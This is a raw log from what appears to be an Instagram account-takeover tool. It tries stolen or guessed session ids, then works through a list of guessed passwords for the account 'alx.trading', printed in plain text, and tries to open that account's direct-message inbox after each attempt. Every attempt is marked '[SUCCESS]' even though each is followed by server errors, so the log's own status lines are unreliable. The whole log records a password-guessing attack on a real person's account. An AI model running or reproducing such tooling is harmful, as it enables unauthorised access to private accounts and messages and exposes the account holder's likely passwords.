2025-05-29 11:50:20,222 INFO Trying sessionid: 82d00883%3A174826442...
2025-05-29 11:50:21,223 INFO https://i.instagram.com/api/v1/users/82/info/
2025-05-29 11:50:21,636 INFO None [200] GET https://i.instagram.com/api/v1/users/82/info/ (269.0.0.18.75, OnePlus 6T Dev)
2025-05-29 11:50:21,637 WARNING Sessionid failed: 'pinned_channels_info'
2025-05-29 11:50:21,637 INFO Trying sessionid: 4976283726%3A1JgRzA5...
2025-05-29 11:50:22,637 INFO https://i.instagram.com/api/v1/users/4976283726/info/
2025-05-29 11:50:22,945 INFO None [404] GET https://i.instagram.com/api/v1/users/4976283726/info/ (269.0.0.18.75, OnePlus 6T Dev)
2025-05-29 11:50:22,945 WARNING Status 404: Endpoint /v1/users/4976283726/info/ does not exist
2025-05-29 11:50:24,838 INFO [None] [401] GET https://www.instagram.com/graphql/query/?variables=%7B%22user_id%22%3A%224976283726%22%2C%22include_reel%22%3Atrue%7D&query_hash=ad99dd9d3646cc3c0dda65debcd266a7
2025-05-29 11:50:28,214 INFO [None] [401] GET https://www.instagram.com/graphql/query/?variables=%7B%22user_id%22%3A%224976283726%22%2C%22include_reel%22%3Atrue%7D&query_hash=ad99dd9d3646cc3c0dda65debcd266a7
2025-05-29 11:50:31,553 INFO [None] [401] GET https://www.instagram.com/graphql/query/?variables=%7B%22user_id%22%3A%224976283726%22%2C%22include_reel%22%3Atrue%7D&query_hash=ad99dd9d3646cc3c0dda65debcd266a7
2025-05-29 11:50:31,553 WARNING Sessionid failed: 401 Client Error: Unauthorized for url: https://www.instagram.com/graphql/query/?variables=%7B%22user_id%22%3A%224976283726%22%2C%22include_reel%22%3Atrue%7D&query_hash=ad99dd9d3646cc3c0dda65debcd266a7
2025-05-29 11:50:31,553 INFO Trying sessionid: 82d00883%3A174826442...
2025-05-29 11:50:32,554 INFO https://i.instagram.com/api/v1/users/82/info/
2025-05-29 11:50:32,807 INFO None [200] GET https://i.instagram.com/api/v1/users/82/info/ (269.0.0.18.75, OnePlus 6T Dev)
2025-05-29 11:50:32,808 WARNING Sessionid failed: 'pinned_channels_info'
2025-05-29 11:50:32,808 INFO All sessionids failed. Trying username/password login...
2025-05-29 11:50:32,808 INFO Trying login: alx.trading:Fleming654
2025-05-29 11:50:32,808 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748519432.json
2025-05-29 11:50:33,809 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
2025-05-29 11:50:46,815 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
2025-05-29 11:50:46,815 INFO Trying login: alx.trading:Alx2023
2025-05-29 11:50:46,816 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748519446.json
2025-05-29 11:50:47,816 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
2025-05-29 11:51:00,845 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
2025-05-29 11:51:00,845 INFO Trying login: alx.trading:Alx1234
2025-05-29 11:51:00,845 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748519460.json
2025-05-29 11:51:01,846 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
2025-05-29 11:51:14,830 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
2025-05-29 11:51:14,830 INFO Trying login: alx.trading:alx2023
2025-05-29 11:51:14,830 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748519474.json
2025-05-29 11:51:15,831 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
2025-05-29 11:51:28,842 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
2025-05-29 11:51:28,843 INFO Trying login: alx.trading:alx1234
2025-05-29 11:51:28,843 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748519488.json
2025-05-29 11:51:29,843 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
2025-05-29 11:51:42,836 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
2025-05-29 11:51:42,836 INFO Trying login: alx.trading:Alx2024
2025-05-29 11:51:42,837 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748519502.json
2025-05-29 11:51:43,837 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
2025-05-29 11:51:56,892 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
2025-05-29 11:51:56,892 INFO Trying login: alx.trading:alx2025
2025-05-29 11:51:56,892 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748519516.json
2025-05-29 11:51:57,893 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
2025-05-29 11:52:11,269 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
2025-05-29 11:52:11,270 INFO Trying login: alx.trading:alx2024
2025-05-29 11:52:11,270 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748519531.json
2025-05-29 11:52:12,271 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
2025-05-29 11:52:25,276 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
2025-05-29 11:52:25,276 INFO Trying login: alx.trading:Alx2025
2025-05-29 11:52:25,277 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748519545.json
2025-05-29 11:52:26,277 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
2025-05-29 11:52:39,294 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
2025-05-29 11:52:39,294 INFO Trying login: alx.trading:Alx12345
2025-05-29 11:52:39,295 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748519559.json
2025-05-29 11:52:40,296 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
2025-05-29 11:52:53,405 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
2025-05-29 11:52:53,406 INFO Trying login: alx.trading:alx12345
2025-05-29 11:52:53,406 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748519573.json
2025-05-29 11:52:54,406 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
2025-05-29 11:53:07,592 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
2025-05-29 11:53:07,593 INFO Trying login: alx.trading:alx123456
2025-05-29 11:53:07,593 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748519587.json
2025-05-29 11:53:08,594 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
2025-05-29 11:53:22,002 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
2025-05-29 11:53:22,002 INFO Trying login: alx.trading:Trading123
2025-05-29 11:53:22,003 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748519602.json
2025-05-29 11:53:23,003 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
2025-05-29 11:53:36,102 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
2025-05-29 11:53:36,102 INFO Trying login: alx.trading:trading123
2025-05-29 11:53:36,102 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748519616.json
2025-05-29 11:53:37,103 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
2025-05-29 11:53:50,472 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
2025-05-29 11:53:50,473 INFO Trying login: alx.trading:Alx123456
2025-05-29 11:53:50,473 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748519630.json
2025-05-29 11:53:51,473 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
2025-05-29 11:54:04,815 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
2025-05-29 11:54:04,815 INFO Trying login: alx.trading:alx.trading12345
2025-05-29 11:54:04,815 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748519644.json
2025-05-29 11:54:05,816 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
2025-05-29 11:54:18,877 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
2025-05-29 11:54:18,878 INFO Trying login: alx.trading:%trading
2025-05-29 11:54:18,878 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748519658.json
2025-05-29 11:54:19,878 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
2025-05-29 11:54:33,022 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
2025-05-29 11:54:33,022 INFO Trying login: alx.trading:Trading#
2025-05-29 11:54:33,023 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748519673.json
2025-05-29 11:54:34,023 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
2025-05-29 11:54:47,180 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
2025-05-29 11:54:47,180 INFO Trying login: alx.trading:!trading
2025-05-29 11:54:47,181 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748519687.json
2025-05-29 11:54:48,181 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
2025-05-29 11:55:01,259 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
2025-05-29 11:55:01,259 INFO Trying login: alx.trading:Alx.trading12345
2025-05-29 11:55:01,260 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748519701.json
2025-05-29 11:55:02,260 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
2025-05-29 11:55:15,623 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
2025-05-29 11:55:15,623 INFO Trying login: alx.trading:trading*
2025-05-29 11:55:15,624 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748519715.json
2025-05-29 11:55:16,624 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
2025-05-29 11:55:29,643 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
2025-05-29 11:55:29,643 INFO Trying login: alx.trading:alx.trading123456
2025-05-29 11:55:29,643 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748519729.json
2025-05-29 11:55:30,644 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
2025-05-29 11:55:43,678 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
2025-05-29 11:55:43,678 INFO Trying login: alx.trading:trading!
2025-05-29 11:55:43,679 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748519743.json
2025-05-29 11:55:44,679 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
2025-05-29 11:55:57,689 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
2025-05-29 11:55:57,689 INFO Trying login: alx.trading:flemingalx.trading123
2025-05-29 11:55:57,689 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748519757.json
2025-05-29 11:55:58,690 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
